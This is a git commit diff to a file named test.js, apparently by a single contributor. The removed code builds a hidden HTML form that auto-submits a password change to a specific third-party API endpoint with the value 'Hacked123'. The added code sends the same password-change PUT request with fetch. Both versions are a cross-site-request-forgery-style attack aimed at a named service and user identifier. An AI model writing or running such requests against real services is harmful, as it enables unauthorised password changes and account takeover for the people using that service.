f784e95d62a151874e10e3ec33eae1eac475450e
Siya <148008409+Siya016@users.noreply.github.com>
2025-03-06 12:25:17 +0530

    Update test.js

--- test.js
+++ test.js
@@ -1,15 +1,13 @@
-const form = document.createElement("form");
-form.action = "https://senso.senselive.io/api/updatePassword/LXIx52UjrO";
-form.method = "PUT";
 
-const input = document.createElement("input");
-input.type = "hidden";
-input.name = "Password";
-input.value = "Hacked123";
-
-form.appendChild(input);
-document.body.appendChild(form);
-form.submit();
-
+fetch("https://senso.senselive.io/api/updatePassword/LXIx52UjrO", {
+    method: "PUT",
+    headers: {
+        "Content-Type": "application/json"
+    },
+    body: JSON.stringify({ password: "newPassword123" })  // Add actual data
+})
+.then(response => response.json())
+.then(data => console.log("Success:", data))
+.catch(error => console.error("Error:", error));
 
 
